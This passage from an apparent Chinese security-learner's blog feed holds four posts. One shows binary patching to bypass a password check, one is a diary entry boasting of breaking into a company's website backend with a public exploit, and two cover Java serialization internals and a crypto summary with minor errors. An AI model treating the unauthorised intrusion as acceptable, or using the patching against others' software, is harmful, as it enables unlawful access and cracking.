scanf(&amp;quot;%s&amp;quot;,password);
valid_flag = verify_password(password);
if(valid_flag){
printf(&amp;quot;incorrect password!\n\n&amp;quot;);
}else{
printf(&amp;quot;Congradulation! You have passed the vrification\n&amp;quot;);
break;
}
}
}
&lt;/code>&lt;/pre>&lt;p>编译获得 crack.exe ，也就是今天要破解的目标了。&lt;/p>
&lt;h2 id="ida-pro静态分析">IDA PRO静态分析&lt;/h2>
&lt;p>打开ida pro，把这个exe拖进去，就获得了一张清晰的执行逻辑结构图&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/18-11-20/62836004.jpg" alt="img" />&lt;/p>
&lt;p>看到这句汇编指令，执行的是跳转，也就是if语句，有两个分支，一个会break，一个则会返回while判断。&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/18-11-20/80649460.jpg" alt="img" />&lt;/p>
&lt;p>按space可以看到对应的汇编语句，&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/18-11-20/76865807.jpg" alt="img" />&lt;/p>
&lt;p>记住红框中的这两个地址，上面的是汇编指令在内存中的虚拟地址VA，下面那个是它在文件中的偏移地址。 关于如何换算VA和FOA，可以参考下面文章&lt;/p>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/baishuiniyaonulia/article/details/78510997" target="_blank" rel="noopener"
>https://blog.csdn.net/baishuiniyaonulia/article/details/78510997&lt;/a>&lt;/p>
&lt;h2 id="hex编辑pe文件">hex编辑PE文件&lt;/h2>
&lt;p>这里我用的notepad的插件hex editor，我们找到刚才那句if语句的偏移地址处，它的逻辑是，如果valid_password是true就继续循环，那么我们可以考虑把这句if的跳转语句修改一下，也就是把je改成比如 jne，je是相等跳转，jne是不相等则跳转。也就是将对应je的(十六进制 74)改成对应jne的（十六进制 75）&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/18-11-20/9798884.jpg" alt="img" />&lt;/p>
&lt;p>上图，我是已经将74修改为了75，这个偏移地址的计算方式可以自行百度，而在IDA pro中已经给出了这个偏移地址，也省去了自己计算的麻烦&lt;/p>
&lt;p>（刚开始我没有发现，自己计算的时候是004015AF-00400000-BAF）逆推的，发现节偏移是600，不知道原因是什么，我看别的文章都是400…&lt;/p>
&lt;h2 id="查看结果">查看结果&lt;/h2>
&lt;p>我们运行crack.exe，发现随便输一个密码就直接跳出循环了，而原来表示正确的密码 1234567，输入后却提示错误了。&lt;/p>
&lt;p>至此，破解完毕。&lt;/p>
&lt;h2 id="xdbg-动态分析">xdbg 动态分析&lt;/h2>
&lt;p>打开xdbg，把crack.exe拖进去…原理同上，f7/f8 跟着查看汇编，对应着修改关键的跳转指令，或者test指令，就可以做到修改pe的执行逻辑了。&lt;/p>
&lt;hr>
&lt;p>本篇介绍至此，时间匆忙，还请看官们多多谅解。&lt;/p></description></item><item><title>校园杂记21: 我的安全之路</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B021-%E6%88%91%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF/</link><pubDate>Tue, 04 Sep 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B021-%E6%88%91%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF/</guid><description>&lt;p>下午日常逛着freebuf，看别人的挖洞经验。&lt;/p>
&lt;p>看累了，随手点开了我的”拿shell”文件夹里的一个站，是个不知名公司，用的某php框架，google hacking找到了后台，看到了框架的版本，神不知鬼不觉的搜了波这框架的漏洞，找到一个exp，一用就拿到了后台，连nmap和whois都没开……&lt;/p>
&lt;p>然而，并没有一种喜悦的感觉，这一切来得似乎太容易。&lt;/p>
&lt;p>以至于后来，吃完饭就直奔操场散了会儿步，慢慢地，心境渐渐开阔，前所未有的明朗，和一位一直以来很感谢的前辈又交流了下，问了点小白问题，确定了自己接下来主要的研究方向: 代码审计 以及 机器学习。&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>因为在散步的时候，回想了过去，似乎什么都接触过，但都算不上深入，了解过代码审计，看过seay大佬的书，但依旧没有领悟。&lt;/p>
&lt;p>下午这个后台一拿，似乎解了某一个心结，我一直以来觉得自己不适合学习安全，因为学了一年拿不到一个shell，但经常看到有初中生高中生拿shell如喝水，心里总认为”他们就是一帮脚本小子，代码没我打的多，原理没我了解的多，书没我读的多，他们拿shell就是靠工具”，用这种方式来欺骗自己，安慰自己，好让自己能继续学习下去。 今天这个后台拿的方式，我和曾经”瞧不起”的人又有什么区别，靠别人写的exp拿的shell，所以才没有一丝喜悦的感觉吧。&lt;/p>
&lt;p>然而，就算这样，我也明白了一些东西，我也许可以算一个script kid了，我一定是向着安全迈出了一步的，离大牛的距离只在于”汗水的积累”了吧 。&lt;/p>
&lt;p>此时此刻的状态，充满了信心，明天又要去见汤老师了😂…不知道他还记得我吗😂，也不敢让他太记得，怕被打唉。 也不知道明天会发生什么事情，但是还是期待的，也不知道匡学长毕业了还是如何，祝前程似锦。&lt;/p>
&lt;hr>
&lt;p>回顾这一年，一年前，我接触到了渗透，认识到了所谓的”安全娱乐圈”，加了不少群，以为能学到不少知识，但看到的是无尽的浮躁。&lt;/p>
&lt;p>于是，没过多久，退了群，自己折腾，中间尝试数次没有拿过shell，觉得自己没有学习安全的”天赋”，流过眼泪，第二天继续研究下去。&lt;/p>
&lt;p>暑假里找到了几个业务逻辑方面的漏洞，原理很简单，同时薅了波漏洞平台的羊毛(40包辣条)…也总算有了点信心。&lt;/p>
&lt;p>读了很多很多的书，总希望自己能靠着阅读量来速成，然而现实总是喜欢打幻想者的脸。 一次次的弱口令爆破失败，一次次的漏洞尝试，渐渐放弃了拿shell的想法，准备专门找漏洞，因此研究更多的细节，钻研更多的原理，今天却仿佛缘分到了，拿到了后台。 没有太多的喜悦，但这算是给自己坚定了信心。&lt;/p>
&lt;p>两年前听过了汤老师讲的专业导读，喜欢上了安全，见过很多大佬写的关于自己起初如何学习安全的故事。 回顾这一年，我终于在今天确定了，自己一定是有所成长的，而这所有的一切，我的代码，我读的书，我写的字，我的体会，我的感受，我遇到的人，就是属于我自己的安全之路。&lt;/p></description></item><item><title>Java序列化与反序列化原理</title><link>https://sera.wang/p/java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</link><pubDate>Fri, 24 Aug 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</guid><description>&lt;h1 id="基本">基本&lt;/h1>
&lt;p>java序列化数据，是通过ObjectOutputStream和ObjectInputStream这两个类来实现的，&lt;/p>
&lt;p>举个例子:&lt;/p>
&lt;blockquote>
&lt;p>要序列化的对象data1&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>public class data1 implements Serializable {
private int id;
private String name;
private String pwd;
private String pwd2;
public int getId(){ return id; }
public void setId(int id){ this.id = id; }
public String getName(){ return name; }
public void setName(String name){ this.name = name; }
public String getPwd(){ return pwd; }
public void setPwd(String pwd){ this.pwd = pwd; }
public String getPwd2(){ return pwd2; }
public void setPwd2(String pwd2){ this.pwd2 = pwd2; }
}
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>序列化操作类SerializeTest&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>public class SerializeTest {
public void serialize() throws Exception{
data1 d = new data1();
d.setId(1036);
d.setName(&amp;quot;data1&amp;quot;);
d.setPwd(&amp;quot;pwd1&amp;quot;);
d.setPwd2(&amp;quot;pwd2&amp;quot;);
FileOutputStream fos = new FileOutputStream(&amp;quot;d:/project/serial/data1&amp;quot;);
ObjectOutputStream oos = new ObjectOutputStream(fos); //创建Object输出流对象
oos.writeObject(d); //向data1文件中写入序列化数据data1类
fos.close();
oos.close();
System.out.println(&amp;quot;序列化完成&amp;quot;);
}
public data1 deSerialize() throws Exception{
FileInputStream fis = new FileInputStream(&amp;quot;d:/project/serial/data1&amp;quot;);
ObjectInputStream ois = new ObjectInputStream(fis); //创建Object输入流对象
data1 d = (data1)ois.readObject(); //从data1文件中反序列化出data1类数据
ois.close();
fis.close();
return d;
}
public static void main(String[] args) throws Exception{
SerializeTest s = new SerializeTest();
s.serialize();
data1 d = s.deSerialize();
System.out.println(&amp;quot;id:&amp;quot;+d.getId());
System.out.println(&amp;quot;name:&amp;quot;+d.getName());
System.out.println(&amp;quot;pwd:&amp;quot;+d.getPwd());
}
}
&lt;/code>&lt;/pre>&lt;p>执行后会发现 序列化成功，输出文件data1，同时反序列化成功，我们可以从data1文件中反序列化出data1类，能够获取其中的信息。&lt;/p>
&lt;p>我们看看data1文件,notepad打开它长这样&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-24/51128411.jpg" alt="img" />&lt;/p>
&lt;p>再按十六进制打开看看，&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-24/82094575.jpg" alt="img" />&lt;/p>
&lt;p>是的，这就是序列化。&lt;/p>
&lt;p>有些字符是能看懂的，比如说data1，id，name，这无疑暴露了很多信息，变量键值对都暴露了，所以网站一般不可能就如此把关键信息这样放进去，应该会有加密，但我们现在首先得知道原理！&lt;/p>
&lt;p>和我开始的设想一样，反序列化就是要将这串二进制流按某种编码规则编码。 具体怎么编码，就得要读读源码才能搞明白了。&lt;/p>
&lt;h1 id="序列化源码解析">&lt;strong>序列化源码解析&lt;/strong>&lt;/h1>
&lt;ol>
&lt;li>
&lt;p>初始化ObjectOutputStream&lt;/p>
&lt;p>序列化靠的是ObjectOutputStream，我们先看它初始化的结果，&lt;/p>
&lt;blockquote>
&lt;p>构造参数&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code> public ObjectOutputStream(OutputStream out) throws IOException {
verifySubclass();
bout = new BlockDataOutputStream(out);
handles = new HandleTable(10, (float) 3.00);
subs = new ReplaceTable(10, (float) 3.00);
enableOverride = false;
writeStreamHeader();
bout.setBlockDataMode(true);
if (extendedDebugInfo) {
debugInfoStack = new DebugTraceInfoStack();
} else {
debugInfoStack = null;
}
}
&lt;/code>&lt;/pre>&lt;p>初始化的代码中，bout是底层字节数据容器&lt;/p>
&lt;p>有行writeStreamHeader()，代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>protected void writeStreamHeader() throws IOException {
bout.writeShort(STREAM_MAGIC);
bout.writeShort(STREAM_VERSION);
}
&lt;/code>&lt;/pre>&lt;p>writeShort是往容器里写两个字节，这里初始化写入了4个字节(一个STREAM_MAGIC ，一个 STREAM_VERSION)&lt;/p>
&lt;pre tabindex="0">&lt;code>/**
* Magic number that is written to the stream header.
*/
final static short STREAM_MAGIC = (short)0xaced;
/**
* Version number that is written to the stream header.
*/
final static short STREAM_VERSION = 5;
&lt;/code>&lt;/pre>&lt;p>即 ac ed 00 05，表示声明使用序列化协议以及说明序列化版本&lt;/p>
&lt;/li>
&lt;li>
&lt;p>开始序列化 writeObject()&lt;/p>
&lt;pre tabindex="0">&lt;code>public final void writeObject(Object obj) throws IOException {
if (enableOverride) {
writeObjectOverride(obj);
return;
}
try {
writeObject0(obj, false);
} catch (IOException ex) {
if (depth == 0) {
writeFatalException(ex);
}
throw ex;
}
}
&lt;/code>&lt;/pre>&lt;p>一般会直接调用writeObject0()&lt;/p>
&lt;pre tabindex="0">&lt;code>private void writeObject0(Object obj, boolean unshared)
throws IOException
{
boolean oldMode = bout.setBlockDataMode(false);
depth++;
try {
// handle previously written and non-replaceable objects
int h;
...省略代码
if (obj instanceof ObjectStreamClass) {
writeClassDesc((ObjectStreamClass) obj, unshared);
return;
}
// check for replacement object
Object orig = obj;
Class&amp;lt;?&amp;gt; cl = obj.getClass();
ObjectStreamClass desc;
for (;;) {
// REMIND: skip this check for strings/arrays?
Class&amp;lt;?&amp;gt; repCl;
desc = ObjectStreamClass.lookup(cl, true);
if (!desc.hasWriteReplaceMethod() ||
(obj = desc.invokeWriteReplace(obj)) == null ||
(repCl = obj.getClass()) == cl)
{
break;
}
cl = repCl;
}
// remaining cases
if (obj instanceof String) {
writeString((String) obj, unshared);
} else if (cl.isArray()) {
writeArray(obj, desc, unshared);
} else if (obj instanceof Enum) {
writeEnum((Enum&amp;lt;?&amp;gt;) obj, desc, unshared);
} else if (obj instanceof Serializable) {
writeOrdinaryObject(obj, desc, unshared);
} else {
if (extendedDebugInfo) {
throw new NotSerializableException(
cl.getName() + &amp;quot;\n&amp;quot; + debugInfoStack.toString());
} else {
throw new NotSerializableException(cl.getName());
}
}
} finally {
depth--;
bout.setBlockDataMode(oldMode);
}
}
&lt;/code>&lt;/pre>&lt;p>后面那些判断，容易看出，根据对象的不同类型，按不同方法写入序列化数据，这里如果对象实现了Serializable接口，就调用writeOrdinaryObject()方法。&lt;/p>
&lt;p>然后发现这个方法还传入了一个desc，这是在此函数之前的一个for(;;)循环里，创建的用来描述该对象类信息的，ObjectStreamClass类。&lt;/p>
&lt;blockquote>
&lt;p>然后看writeOrdinaryObject()&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>private void writeOrdinaryObject(Object obj,
ObjectStreamClass desc,
boolean unshared)
throws IOException
{
if (extendedDebugInfo) {
debugInfoStack.push(
(depth == 1 ? &amp;quot;root &amp;quot; : &amp;quot;&amp;quot;) + &amp;quot;object (class \&amp;quot;&amp;quot; +
obj.getClass().getName() + &amp;quot;\&amp;quot;, &amp;quot; + obj.toString() + &amp;quot;)&amp;quot;);
}
try {
desc.checkSerialize();
bout.writeByte(TC_OBJECT);
writeClassDesc(desc, false);
handles.assign(unshared ? null : obj);
if (desc.isExternalizable() &amp;amp;&amp;amp; !desc.isProxy()) {
writeExternalData((Externalizable) obj);
} else {
writeSerialData(obj, desc);
}
} finally {
if (extendedDebugInfo) {
debugInfoStack.pop();
}
}
}
&lt;/code>&lt;/pre>&lt;p>先是writeByte()，写入了一个字节的TC_OBJECT标志位(十六进制 73)，然后调用writeClassDesc(desc)，把之前生成的该类信息写入，&lt;/p>
&lt;blockquote>
&lt;p>跟进看writeClassDesc()&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>private void writeClassDesc(ObjectStreamClass desc, boolean unshared)
throws IOException
{
int handle;
if (desc == null) {
writeNull();
} else if (!unshared &amp;amp;&amp;amp; (handle = handles.lookup(desc)) != -1) {
writeHandle(handle);
} else if (desc.isProxy()) {
writeProxyDesc(desc, unshared);
} else {
writeNonProxyDesc(desc, unshared);
}
}
&lt;/code>&lt;/pre>&lt;p>isProxy()判断类是否是动态代理类，没了解过动态代理（先mark），这里因为不是动态代理类，所以会调用writeNonProxyDesc(desc)&lt;/p>
&lt;blockquote>
&lt;p>跟进writeNonProxyDesc(desc)&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>private void writeNonProxyDesc(ObjectStreamClass desc, boolean unshared)
throws IOException
{
bout.writeByte(TC_CLASSDESC);
handles.assign(unshared ? null : desc);
if (protocol == PROTOCOL_VERSION_1) {
// do not invoke class descriptor write hook with old protocol
desc.writeNonProxy(this);
} else {
writeClassDescriptor(desc);
}
Class&amp;lt;?&amp;gt; cl = desc.forClass();
bout.setBlockDataMode(true);
if (cl != null &amp;amp;&amp;amp; isCustomSubclass()) {
ReflectUtil.checkPackageAccess(cl);
}
annotateClass(cl);
bout.setBlockDataMode(false);
bout.writeByte(TC_ENDBLOCKDATA);
writeClassDesc(desc.getSuperDesc(), false);
}
&lt;/code>&lt;/pre>&lt;p>发现writeByte写入了一个字节的TC_CLASSDESC(16进制 72)&lt;/p>
&lt;p>然后下面一个判断是true进入writeNonProxy()&lt;/p>
&lt;blockquote>
&lt;p>writeNonProxy()&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>void writeNonProxy(ObjectOutputStream out) throws IOException {
out.writeUTF(name);
out.writeLong(getSerialVersionUID());
byte flags = 0;
if (externalizable) {
flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;
int protocol = out.getProtocolVersion();
if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {
flags |= ObjectStreamConstants.SC_BLOCK_DATA;
}
} else if (serializable) {
flags |= ObjectStreamConstants.SC_SERIALIZABLE;
}
if (hasWriteObjectData) {
flags |= ObjectStreamConstants.SC_WRITE_METHOD;
}
if (isEnum) {
flags |= ObjectStreamConstants.SC_ENUM;
}
out.writeByte(flags);
out.writeShort(fields.length);
for (int i = 0; i &amp;lt; fields.length; i++) {
ObjectStreamField f = fields[i];
out.writeByte(f.getTypeCode());
out.writeUTF(f.getName());
if (!f.isPrimitive()) {
out.writeTypeString(f.getTypeString());
}
}
}
&lt;/code>&lt;/pre>&lt;p>调用writeUTF()写入了类名，这个writeUTF()函数，在写入十六进制类名前，会先写入两个字节的类名长度，&lt;/p>
&lt;p>然后再调用writeLong，写入序列化UID&lt;/p>
&lt;p>然后下面有个判断，会判断类接口的实现方式，调用writeByte()写入一个字节的标志位。&lt;/p>
&lt;blockquote>
&lt;p>下面是所有标志位&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>/**
* Bit mask for ObjectStreamClass flag. Indicates Externalizable data
* written in Block Data mode.
* Added for PROTOCOL_VERSION_2.
*
* @see #PROTOCOL_VERSION_2
* @since 1.2
*/
final static byte SC_BLOCK_DATA = 0x08;
/**
* Bit mask for ObjectStreamClass flag. Indicates class is Serializable.
*/
final static byte SC_SERIALIZABLE = 0x02;
/**
* Bit mask for ObjectStreamClass flag. Indicates class is Externalizable.
*/
final static byte SC_EXTERNALIZABLE = 0x04;
/**
* Bit mask for ObjectStreamClass flag. Indicates class is an enum type.
* @since 1.5
*/
final static byte SC_ENUM = 0x10;
&lt;/code>&lt;/pre>&lt;p>然后调用writeShort写入两个字节的域长度（比如说有3个变量，就写入 00 03 ）&lt;/p>
&lt;p>接下来是一个循环，准备写入这个类的变量名和它对应的变量类型了&lt;/p>
&lt;p>&lt;strong>每轮循环&lt;/strong>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>writeByte写入一个字节的变量类型;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>writeUTF()写入变量名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>有个判断，判断是不是原始类型，即是不是对象&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>不是基本类型的话，就调用writeTypeString()&lt;/p>
&lt;p>这个writeTypeString()，如果是字符串，就会调用writeString()&lt;/p>
&lt;p>而这个writeString()往往是这样写的，字符串长度(不是大小)小于两个字节，就先写入一个字节的TC_STRING(16进制 74)，然后调用writeUTF()，写入一个signature，这好像跟jvm有关，最后一般写的是&lt;/p>
&lt;blockquote>
&lt;p>74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b&lt;/p>
&lt;/blockquote>
&lt;p>“翻译”过来就是，字符串类型，占18个字节长度，变量名是 Ljava/lang/string;&lt;/p>
&lt;p>而如果说，之前已经写过刚刚这串74 00 12…3b&lt;/p>
&lt;p>那会调用writeHandle()，先写入一个字节的TC_REFERENCE(16进制 71)，然后调用writeInt()写入 007e0000 + handle，这个handle是之前声明过对象的位置，这里我还没弄清除这个位置是怎么定位的，一般是00 01，也就是说 writeHandle()，一般写入类似&lt;/p>
&lt;blockquote>
&lt;p>71 00 7e 00 XX&lt;/p>
&lt;/blockquote>
&lt;p>这样5个字节(最后这个00 XX 还不确定，等我再弄明白，一般是 00 01)&lt;/p>
&lt;hr>
&lt;p>上面这些结束了，也就是我们写完了writeNonProxy()，现在再次回到writeNonProxyDesc()&lt;/p>
&lt;p>接下来继续调用writeByte()写入一个字节的TC_ENDBLOCKDATA(16进制 78，表示块结束标志位)。&lt;/p>
&lt;p>再调用writeCLassDesc()，参数是desc的父类。&lt;/p>
&lt;p>这里如果父类没有实现序列化接口那就不会写入，否则回到刚才writeNonProxyDesc那一步开始写父类的类信息和变量信息(起始位72，终止位78)，类似于一个递归调用，最后如果没有实现了序列化接口的父类了，就会调用writeNull()，写入一个字节的TC_NULL(16进制 70)，表示没对象了。&lt;/p>
&lt;hr>
&lt;p>好了，总之writeClassDesc()这个递归调用完了之后，我们就回到了writeOrdinaryObject()&lt;/p>
&lt;p>接下来调用writeSerialData()，准备写入序列化数据&lt;/p>
&lt;blockquote>
&lt;p>writeSerialData()&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>private void writeSerialData(Object obj, ObjectStreamClass desc)
throws IOException
{
ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();
for (int i = 0; i &amp;lt; slots.length; i++) {
ObjectStreamClass slotDesc = slots[i].desc;
if (slotDesc.hasWriteObjectMethod()) {
PutFieldImpl oldPut = curPut;
curPut = null;
SerialCallbackContext oldContext = curContext;
if (extendedDebugInfo) {
debugInfoStack.push(
&amp;quot;custom writeObject data (class \&amp;quot;&amp;quot; +
slotDesc.getName() + &amp;quot;\&amp;quot;)&amp;quot;);
}
try {
curContext = new SerialCallbackContext(obj, slotDesc);
bout.setBlockDataMode(true);
slotDesc.invokeWriteObject(obj, this);
bout.setBlockDataMode(false);
bout.writeByte(TC_ENDBLOCKDATA);
} finally {
curContext.setUsed();
curContext = oldContext;
if (extendedDebugInfo) {
debugInfoStack.pop();
}
}
curPut = oldPut;
} else {
defaultWriteFields(obj, slotDesc);
}
}
}
&lt;/code>&lt;/pre>&lt;p>一个循环，上限是类(包括父类)数量&lt;/p>
&lt;p>&lt;strong>每轮循环:&lt;/strong>&lt;/p>
&lt;p>调用defaultWriteFields()&lt;/p>
&lt;blockquote>
&lt;p>defaultWriteFields()&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>private void defaultWriteFields(Object obj, ObjectStreamClass desc)
throws IOException
{
Class&amp;lt;?&amp;gt; cl = desc.forClass();
if (cl != null &amp;amp;&amp;amp; obj != null &amp;amp;&amp;amp; !cl.isInstance(obj)) {
throw new ClassCastException();
}
desc.checkDefaultSerialize();
int primDataSize = desc.getPrimDataSize();
if (primVals == null || primVals.length &amp;lt; primDataSize) {
primVals = new byte[primDataSize];
}
desc.getPrimFieldValues(obj, primVals);
bout.write(primVals, 0, primDataSize, false);
ObjectStreamField[] fields = desc.getFields(false);
Object[] objVals = new Object[desc.getNumObjFields()];
int numPrimFields = fields.length - objVals.length;
desc.getObjFieldValues(obj, objVals);
for (int i = 0; i &amp;lt; objVals.length; i++) {
if (extendedDebugInfo) {
debugInfoStack.push(
&amp;quot;field (class \&amp;quot;&amp;quot; + desc.getName() + &amp;quot;\&amp;quot;, name: \&amp;quot;&amp;quot; +
fields[numPrimFields + i].getName() + &amp;quot;\&amp;quot;, type: \&amp;quot;&amp;quot; +
fields[numPrimFields + i].getType() + &amp;quot;\&amp;quot;)&amp;quot;);
}
try {
writeObject0(objVals[i],
fields[numPrimFields + i].isUnshared());
} finally {
if (extendedDebugInfo) {
debugInfoStack.pop();
}
}
}
}
&lt;/code>&lt;/pre>&lt;p>先判断是否是基本类型，是的话调用write直接写入序列化数据&lt;/p>
&lt;p>否则，获取该类所有变量数，开始循环&lt;/p>
&lt;p>&lt;strong>每轮:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>调用writeObject0()写入变量，也就是说，根据变量类型，用相应方法写入。&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>最后循环结束；&lt;/strong>&lt;/p>
&lt;p>随着所有变量的写入，先前一次循环也结束，writeSerialData()方法调用完毕，回到了writeOrdinaryObject()，执行结束回到了writeObject0()，又回到了writeObject()。&lt;/p>
&lt;p>以上，就是序列化全过程，可能还有些细节有疏漏，因为我接触java时间不长，很多地方不明白，如有错误请指正！&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="反序列化源码解析">&lt;strong>反序列化源码解析&lt;/strong>&lt;/h1>
&lt;p>待续…&lt;/p>
&lt;h1 id="小总结">小总结&lt;/h1>
&lt;p>刚开始想的是，要了解反序列化，就得要知道序列化原理，因为逛网站看到很多都是java写的，所以想着先读java的序列化源码，机制应该大多类似，但具体实现我总感觉会有不同，这样子就会给反序列化带来一定困难(?)，因为一开始心里其实想的是写一个通用性反序列化工具，感觉挺有意思，但顶着发烧简单弄明白上面的流程也已经花了三四天了。&lt;/p>
&lt;p>感觉反序列化应该是容易实现的一个东西，网站如果只单纯序列化传输数据，容易造成信息泄露，所以一般都会在关键参数加密后再序列化吧…但是不反序列化连看到加密参数的机会都没有，对吧？&lt;/p></description></item><item><title>常见摘要/加密算法总结</title><link>https://sera.wang/p/%E5%B8%B8%E8%A7%81%E6%91%98%E8%A6%81/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</link><pubDate>Sat, 18 Aug 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E5%B8%B8%E8%A7%81%E6%91%98%E8%A6%81/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</guid><description>&lt;p>最近逛到某网站碰到一个叫JWTtoken的验证机制，然后百度了一波jwt，再解码此jwttoken后看到是RSA256加密，明明最近才看过现在又忘光了…于是对常见算法做个总结吧！原理不会特别详细，只会介绍简单原理，让我以后再碰上不至于太懵逼。&lt;/p>
&lt;h1 id="基本概念">基本概念&lt;/h1>
&lt;blockquote>
&lt;p>安全性原则：&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>保密性&lt;/li>
&lt;li>完整性(内容不被篡改)&lt;/li>
&lt;li>身份认证&lt;/li>
&lt;li>不可抵赖性&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>对称/非对称加密&lt;/p>
&lt;/blockquote>
&lt;p>若加解密使用相同密钥，则称为对称密钥加密，否则称为非对称密钥加密。&lt;/p>
&lt;blockquote>
&lt;p>对称密钥加密:Diffie-Hellman算法&lt;/p>
&lt;/blockquote>
&lt;p>因为密钥发布和密钥交换存在很多问题，所以要知道Diffie-Hellman密钥交换协议/算法。&lt;/p>
&lt;p>通信双发可用此方法确定对称密钥，此方法只能用于密钥交换，而非加解密消息。&lt;/p>
&lt;pre tabindex="0">&lt;code>算法描述:
设A与B要确定密钥
1) A与B确定2个大素数 n 和 g 。 不必保密
2) A选择另一个大随机数X，计算:
k1 = g^X mod n 后将k1发给B
3) B选择另一个大随机数Y，计算:
k2 = g^Y mod n 后将k2发给A
4) 则密钥即为:
kA = k2^X mod n
kB = k1^Y mod n
且kA = kB
&lt;/code>&lt;/pre>&lt;p>原理:&lt;/p>
&lt;p>kA = (g^Y mod n)^X mod n = g^YX mod n&lt;/p>
&lt;p>kB = (g^X mod n)^Y mod n = g^XY mod n&lt;/p>
&lt;p>当然，这个容易受中间人攻击，攻击者可以同时与两方通信交换密钥，因为此方法没有身份认证。（于是考虑CA）&lt;/p>
&lt;blockquote>
&lt;p>非对称密钥加密&lt;/p>
&lt;/blockquote>
&lt;p>此模式中，A和B不用同时访问可信任第三方以求出锁与密钥对&lt;/p>
&lt;p>B有密钥对私钥与公钥，公钥用于封箱，私钥用于开锁。B将公钥和锁(某个加密算法)发给任何人(如A)，使其可以安全地向B发送消息(公钥加密只有私钥能解密，保密性)。而B可以用私钥开锁得到内容。&lt;/p>
&lt;p>一方从另一方接收安全消息时，就将锁与密钥对发给另一方。&lt;/p>
&lt;blockquote>
&lt;p>算法模式&lt;/p>
&lt;/blockquote>
&lt;p>ECB,CBC,CFB,OFB,CTR&lt;/p>
&lt;h1 id="des">DES&lt;/h1>
&lt;p>数据加密标准 (Data Encryption Standard)&lt;/p>
&lt;blockquote>
&lt;p>工作原理:&lt;/p>
&lt;/blockquote>
&lt;p>DES是个块加密法，按64位块长加密数据，即把64位明文作为DES的输入，输入64位密文。&lt;/p>
&lt;p>加密与解密使用相同的算法和密钥，密钥长度为56位。&lt;/p>
&lt;blockquote>
&lt;p>加密步骤:&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>
&lt;p>将64位明文块输入初始置换函数(IP)对明文进行初始置换(按某个表进行 位变换，比如第1位和第xx位交换)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>产生转换块的2半(左明文LPT和右明文RPT，各32位)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每个LPT和RPT经过16轮加密（每轮: 各有自己的密钥，56位密钥移位后用一个位变换表产生不同的48位子密钥，然后将32位RPT进行拓展置换(就是某些位冗余)到48位，再进行S盒替换(复杂)，输出32位，再进行p盒替换，类似ip的简单置换，然后将LPT与p盒置换结果进行异或得到新的RPT，旧的RPT变成新的LPT）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最后将LPT和RPT重接起来，对组成的块进行最终置换FP输出64位密文&lt;/p>
&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>DES变体:&lt;/p>
&lt;/blockquote>
&lt;p>双重DES，就是使用两密钥，密钥1对原文加密，结果再用密钥2加密。
三重DES，同上。&lt;/p>
&lt;h1 id="rsa">RSA&lt;/h1>
&lt;p>RSA是一种非对称密钥算法，基于这样的数学事实:两个大素数相乘很容易，而对得到的积求因子则很难，算法本身很简单，实际难度在于RSA选择和生成的密钥与公钥。&lt;/p>
&lt;pre tabindex="0">&lt;code>算法描述:
为了生成RSA公钥和私钥，B需要执行如下:
1) 选择2个大素数p和q (值越大，破解RSA越困难，执行加解密时间越长，因为指数运算很费时)
2) 计算 n = p*q 和 z = (p-1)*(q-1)
